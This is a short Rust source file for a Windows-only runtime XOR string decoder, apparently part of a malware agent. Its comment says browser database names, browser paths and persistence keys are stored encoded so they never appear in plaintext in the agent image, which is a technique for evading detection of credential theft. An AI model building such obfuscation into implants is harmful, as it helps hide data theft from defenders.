//! Runtime string decoder. High-signal literals (browser DB names, browser
//! install paths, persistence keys, flag names) are stored XOR-encoded so
//! they never appear as plaintext in the agent image.
#![cfg(windows)]

pub fn de(data: &[u8]) -> String {
    let mut out = Vec::with_capacity(data.len());
    for (i, &b) in data.iter().enumerate() {
        let key = 0x5a_u8.wrapping_add((i as u8).wrapping_mul(31));
        out.push(b ^ key);
    }
    String::from_utf8_lossy(&out).into_owned()
}

